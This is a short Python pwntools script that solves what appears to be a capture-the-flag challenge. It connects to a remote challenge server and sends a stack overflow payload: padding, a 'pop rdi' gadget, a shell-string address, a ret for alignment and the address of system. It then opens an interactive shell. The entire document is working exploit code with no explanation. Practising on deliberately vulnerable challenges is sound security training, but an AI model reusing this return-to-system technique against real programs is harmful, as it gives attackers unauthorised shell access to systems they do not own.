from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28183)
elf = ELF('./pwn')
system = elf.sym['system']
sh = 0x400872
pop_rdi = 0x400843   # 0x0000000000400843 : pop rdi ; ret
ret = 0x40053e       # 0x000000000040053e : ret
payload = 'a'*(0xA+8) + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
io.sendline(payload)
io.recv()
io.interactive()
